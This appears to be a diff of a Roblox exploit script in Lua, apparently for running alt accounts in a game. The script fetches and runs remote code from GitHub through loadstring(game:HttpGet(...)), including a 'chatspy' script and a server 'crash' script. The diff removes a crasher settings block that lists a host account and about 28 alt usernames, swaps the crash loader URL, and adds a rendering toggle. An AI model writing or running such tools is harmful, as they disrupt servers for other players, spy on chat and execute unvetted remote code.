@@ -39,43 +39,7 @@ end
 loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/others/main/chatspy.lua"))()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/W9K/roblox-scripts/main/DHC/SimpleSeller.lua', true))()
 
-getgenv().Crasher_Settings = {
-    ["Host"] = "MollyKnox17",
-    ["AltFPS"] = "2",
-    ["Strength"] = "100",
-    ["Alts"]  = { 
-        "JMANDHC1",
-        "JMANDHC2", 
-        "JMANDHC3",
-        "JMANDHC4",
-        "JMANDHC5",
-        "JMANDHC6",
-        "JMANDHC7",
-        "JMANDHC8",
-        "JMANDHC9",
-        "JMANDHC",
-        "JMANDHC11",
-        "Dropperniredja1",
-        "Dropperniredja2",
-        "Dropperniredja3",
-        "Dropperniredja4",
-        "Dropperniredja5",
-        "Lueilwitz58936",
-        "Sipes79236",
-        "Frami58765",
-        "Reinger83675",
-        "Leannon59048",
-        "DavidTapia4",
-        "AmySaunders8",
-        "KatherinePowers7",
-        "MaryKidd21",
-        "SusanBurton50",
-        "TamiHernandez6",
-        "TracyTodd5"
-    }
-}
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/crash/main/main"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/crashnew/main/crash"))()
 
 local plr = game.Players.LocalPlayer
 local ScreenHide = false
@@ -150,6 +114,7 @@ game:GetService('UserInputService').InputBegan:Connect(function(Key)
 			TextLabel_3.TextSize = 14.000
 			TextLabel_3.TextWrapped = true
 			setfpscap(2)
+			game:service"RunService":Set3dRenderingEnabled(true)
 			ScreenHide = true
 		end
 	end
